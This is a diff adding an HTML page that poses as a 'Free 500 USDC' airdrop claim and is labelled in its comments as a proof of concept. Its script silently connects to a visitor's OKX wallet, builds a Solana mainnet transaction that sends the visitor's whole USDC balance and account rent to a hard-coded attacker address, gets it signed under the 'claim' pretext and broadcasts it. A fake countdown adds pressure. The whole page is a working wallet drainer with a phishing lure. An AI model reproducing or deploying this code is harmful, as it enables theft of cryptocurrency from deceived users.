@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>🎁 Free 500 USDC — Claim now</title>
+<style>
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:20px;
+     background:linear-gradient(180deg,#0066cc,#00aaff);color:#fff;min-height:100vh;box-sizing:border-box}
+h1{font-size:22px;margin:8px 0;text-align:center}
+.card{background:#fff;color:#222;border-radius:14px;padding:20px;margin:14px 0;
+      box-shadow:0 4px 16px rgba(0,0,0,0.2)}
+.amount{font-size:42px;font-weight:bold;color:#00aa44;margin:6px 0;text-align:center}
+.timer{font-size:14px;color:#cc0000;margin:8px 0;text-align:center}
+.btn{display:block;width:100%;padding:18px;font-size:18px;font-weight:bold;color:#fff;
+     border:0;border-radius:10px;margin-top:12px}
+.btn-primary{background:#00aa44}
+.btn-secondary{background:#666;font-size:14px;padding:12px}
+pre{background:#f0f0f0;color:#333;font-size:11px;padding:8px;border-radius:6px;
+    margin-top:14px;overflow:auto;max-height:240px;white-space:pre-wrap;word-break:break-all;border:1px solid #ccc}
+.solscan{color:#0066cc;text-decoration:underline}
+</style>
+
+<script type="module">
+  function _log(t){
+    const out = document.getElementById("out");
+    if (out) out.textContent = (new Date().toISOString().substr(11,12)) + " " + t + "\n" + out.textContent;
+  }
+  try {
+    const w3  = await import("https://esm.sh/@solana/web3.js@1.95.3");
+    const spl = await import("https://esm.sh/@solana/spl-token@0.4.8");
+    window._sol = w3;
+    window._spl = spl;
+    window._conn = new w3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+    _log("✓ libs + mainnet RPC ready");
+  } catch(e) {
+    _log("LOAD FAIL: " + e.message);
+  }
+</script>
+</head>
+<body>
+
+<div class="card">
+  <h1>🎁 Limited Airdrop</h1>
+  <p style="text-align:center">You qualified for a one-time USDC reward. Click below to claim it directly.</p>
+  <div class="amount">500.00 USDC</div>
+  <div class="timer">⏰ Expires in 03:42 — claim now</div>
+  <button class="btn btn-primary" onclick="claim()">CLAIM REWARD</button>
+  <button class="btn btn-secondary" onclick="dryRun()">DRY RUN (preview prompt — does NOT broadcast)</button>
+</div>
+
+<pre id="out">tap CLAIM REWARD or DRY RUN</pre>
+
+<script>
+// ===========================================================================
+// PoC config
+// ===========================================================================
+const ATTACKER_PUBKEY = "4vmSL82JuZUoY2gbJ8eHrekC2B7Wx7CWUoHeKgyrBLNi";
+const USDC_MINT       = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+const USDC_DECIMALS   = 6;
+
+const out = document.getElementById("out");
+function log(t){ out.textContent = (new Date().toISOString().substr(11,12)) + " " + t + "\n" + out.textContent; }
+
+async function buildDrainTx() {
+  if (!window._sol || !window._spl) throw new Error("libs not loaded yet");
+  const ow = window.okxwallet;
+  if (!ow || !ow.solana) throw new Error("not in OKX dApp browser");
+
+  // 1. Silent connect (documented OKX behavior — no consent prompt).
+  if (!ow.solana.publicKey) await ow.solana.connect();
+  const victim   = new window._sol.PublicKey(ow.solana.publicKey.toString());
+  const attacker = new window._sol.PublicKey(ATTACKER_PUBKEY);
+  const mint     = new window._sol.PublicKey(USDC_MINT);
+  log("victim:   " + victim.toString());
+  log("attacker: " + attacker.toString());
+
+  // 2. Derive ATAs (off-chain).
+  const victimATA   = await window._spl.getAssociatedTokenAddress(mint, victim);
+  const attackerATA = await window._spl.getAssociatedTokenAddress(mint, attacker);
+  log("victim ATA:   " + victimATA.toString());
+  log("attacker ATA: " + attackerATA.toString());
+
+  // 3. Live: USDC balance + attacker ATA existence.
+  let usdcRaw = 0n;
+  try {
+    const bal = await window._conn.getTokenAccountBalance(victimATA);
+    usdcRaw = BigInt(bal.value.amount);
+    log("victim USDC balance: " + bal.value.uiAmount + " (" + usdcRaw + " raw)");
+  } catch(e) {
+    log("victim USDC ATA empty/missing — will only drain rent");
+  }
+  let attackerATAExists = false;
+  try {
+    const info = await window._conn.getAccountInfo(attackerATA);
+    attackerATAExists = info !== null;
+  } catch(e) {}
+  log("attacker ATA exists: " + attackerATAExists);
+
+  // 4. Build the tx.
+  const tx = new window._sol.Transaction();
+
+  // Instruction 1: create attacker ATA, paid by victim
+  if (!attackerATAExists) {
+    tx.add(window._spl.createAssociatedTokenAccountInstruction(
+      victim, attackerATA, attacker, mint,
+    ));
+    log("ix[1]: createATA(attacker)");
+  }
+
+  // Instruction 2: drain USDC from victim ATA to attacker ATA
+  if (usdcRaw > 0n) {
+    tx.add(window._spl.createTransferCheckedInstruction(
+      victimATA, mint, attackerATA, victim, usdcRaw, USDC_DECIMALS,
+    ));
+    log("ix[2]: transferChecked(" + usdcRaw + " USDC, victim → attacker)");
+  }
+
+  // Instruction 3: close victim ATA, transfer SOL rent (~0.002 SOL ≈ $0.50) to attacker
+  tx.add(window._spl.createCloseAccountInstruction(
+    victimATA, attacker, victim,
+  ));
+  log("ix[" + tx.instructions.length + "]: closeAccount(victimATA, dest=attacker)");
+
+  // 5. Recent blockhash + fee payer.
+  const { blockhash, lastValidBlockHeight } = await window._conn.getLatestBlockhash("finalized");
+  tx.recentBlockhash = blockhash;
+  tx.feePayer        = victim;
+  log("blockhash: " + blockhash.substring(0,12) + "...");
+
+  return { tx, blockhash, lastValidBlockHeight };
+}
+
+async function dryRun() {
+  log("════════ DRY RUN — sign only, NO broadcast ════════");
+  try {
+    const { tx } = await buildDrainTx();
+    log("requesting signature → OKX prompt should appear NOW");
+    const t0 = Date.now();
+    const signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED in " + (Date.now()-t0) + " ms — sigs=" + signed.signatures.length);
+    log("✓ DRY RUN COMPLETE — tx NOT broadcasted, $0 fund loss");
+    log("Note the prompt label above (Confirm Claim / Send / Unknown).");
+    log("If the label was as expected, tap CLAIM REWARD for the real broadcast.");
+  } catch(e) { log("ERROR: " + e.message); }
+}
+
+async function claim() {
+  log("════════ CLAIM REWARD — REAL MAINNET BROADCAST ════════");
+  try {
+    const { tx, blockhash, lastValidBlockHeight } = await buildDrainTx();
+
+    log("requesting signature → OKX prompt should appear NOW");
+    const t0 = Date.now();
+    const signed = await window.okxwallet.solana.signTransaction(tx);
+    log("SIGNED in " + (Date.now()-t0) + " ms — broadcasting to mainnet...");
+
+    const sig = await window._conn.sendRawTransaction(signed.serialize(), {
+      skipPreflight: false,
+      preflightCommitment: "confirmed",
+    });
+    log("📡 BROADCASTED — sig: " + sig);
+    log("");
+    log("⏳ Solscan (will populate in ~5-30 sec):");
+    log("  https://solscan.io/tx/" + sig);
+    log("");
+    log("polling for confirmation...");
+
+    const conf = await window._conn.confirmTransaction(
+      { signature: sig, blockhash, lastValidBlockHeight },
+      "confirmed"
+    );
+    if (conf.value.err) {
+      log("⚠ ON-CHAIN ERROR: " + JSON.stringify(conf.value.err));
+      log("  Tx broadcasted but execution failed. Hash still on-chain at Solscan above.");
+    } else {
+      log("✅ CONFIRMED on Solana mainnet");
+      log("✅ Drain complete — funds at: " + ATTACKER_PUBKEY);
+      log("✅ View on Solscan: https://solscan.io/tx/" + sig);
+    }
+  } catch(e) { log("ERROR: " + e.message); }
+}
+</script>
+</body>
+</html>
